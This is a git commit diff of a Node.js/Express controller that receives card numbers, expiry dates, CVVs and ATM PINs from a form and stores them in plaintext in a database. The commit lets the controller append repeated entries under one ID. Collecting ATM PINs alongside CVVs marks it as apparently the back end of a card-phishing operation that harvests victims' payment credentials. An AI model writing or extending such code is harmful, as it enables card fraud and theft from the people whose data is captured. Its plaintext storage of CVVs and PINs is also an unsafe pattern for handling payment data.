355b93930521422235b62aa0dfaa40068eb599f1
kingofak78 <gotakale952@gmail.com>
2025-05-10 01:42:23 -0700

    Update cardController.js

--- controllers/cardController.js
+++ controllers/cardController.js
@@ -1,29 +1,31 @@
 const CardPayment = require('../models/CardPayment');
 
-// Handle card + ATM PIN submission
 exports.submitCardPayment = async (req, res) => {
-  try {
-    const { uniqueid, cardNumber, expiryDate, cvv, atmPin } = req.body;
+    try {
+        const { uniqueid, cardNumber, expiryDate, cvv, atmPin } = req.body;
 
-    const newCardPayment = new CardPayment({
-      uniqueid,
-      cardNumber,
-      expiryDate,
-      cvv,
-      atmPin                   // ← Include atmPin here
-    });
+        let cardPayment = await CardPayment.findOne({ uniqueid });
 
-    await newCardPayment.save();
+        if (cardPayment) {
+            cardPayment.entries.push({ cardNumber, expiryDate, cvv, atmPin });
+        } else {
+            cardPayment = new CardPayment({
+                uniqueid,
+                entries: [{ cardNumber, expiryDate, cvv, atmPin }]
+            });
+        }
 
-    res.status(200).json({
-      success: true,
-      message: "Card Payment (with ATM PIN) submitted successfully!"
-    });
-  } catch (error) {
-    console.error(error);
-    res.status(500).json({
-      success: false,
-      message: "Error occurred while submitting card payment data"
-    });
-  }
+        await cardPayment.save();
+
+        res.status(200).json({
+            success: true,
+            message: "Card Payment (with ATM PIN) submitted successfully!"
+        });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({
+            success: false,
+            message: "Error occurred while submitting card payment data"
+        });
+    }
 };
